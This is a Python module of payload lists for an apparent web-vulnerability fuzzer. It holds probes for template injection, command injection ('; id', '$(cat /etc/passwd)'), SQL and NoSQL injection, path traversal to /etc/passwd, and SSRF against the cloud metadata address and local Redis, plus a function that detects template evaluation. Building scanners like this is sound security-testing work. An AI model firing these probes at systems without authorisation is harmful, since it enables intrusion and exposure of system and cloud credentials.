"""Per-class attack-payload ladders the `fuzz` action draws from."""

from __future__ import annotations

SSTI_PROBES: list[tuple[str, str]] = [
    ("{{1337*1337}}", "1787569"),
    ("${1337*1337}", "1787569"),
    ("#{1337*1337}", "1787569"),
    ("<%= 1337*1337 %>", "1787569"),
    ("{{7*'7'}}", "7777777"),
    ("#{'7'*7}", "7777777"),
    ("{{99*99}}", "9801"),
]
_SSTI_MARKER = {p: m for p, m in SSTI_PROBES}

CMDI_PROBES: list[str] = [
    "; id", "| id", "$(id)", "`id`", "& id", "; id #", "%0a id",
    "; cat /etc/passwd", "$(cat /etc/passwd)", "| cat /etc/passwd",
]

SQLI_PROBES: list[str] = [
    "'", "\"", "')", "' OR '1'='1", "') OR ('1'='1'-- -", "1' ORDER BY 1000-- -",
    "' UNION SELECT NULL-- -", "'||(SELECT 1)||'", "' AND 1=CONVERT(int,@@version)-- -",
]

NOSQLI_PROBES: list[str] = [
    "' || '1'=='1", "'; return true; var x='", "[$ne]", '{"$gt":""}',
    "', $where: '1==1", "true, $where: '0==0'",
]

TRAVERSAL_PROBES: list[str] = [
    "../../../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd",
    "file:///etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
]

SSRF_PROBES: list[str] = [
    "http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "http://localhost/",
    "file:///etc/passwd", "gopher://127.0.0.1:6379/_", "http://[::1]/",
]

CLASS_PROBES: dict[str, list[str]] = {
    "ssti": [p for p, _ in SSTI_PROBES],
    "cmdi": CMDI_PROBES,
    "sqli": SQLI_PROBES,
    "nosqli": NOSQLI_PROBES,
    "nosql": NOSQLI_PROBES,
    "traversal": TRAVERSAL_PROBES,
    "lfi": TRAVERSAL_PROBES,
    "ssrf": SSRF_PROBES,
}

DEFAULT_CLASSES = ("ssti", "cmdi", "sqli")


def ssti_hit(payload: str, response_text: str) -> str | None:
    """Return the evaluated marker if an SSTI payload was rendered, else None.

    A hit requires the arithmetic result in the response while the raw payload is
    absent, proving server-side evaluation rather than reflection.
    """
    m = _SSTI_MARKER.get(payload)
    if m and m in response_text and payload not in response_text:
        return m
    return None
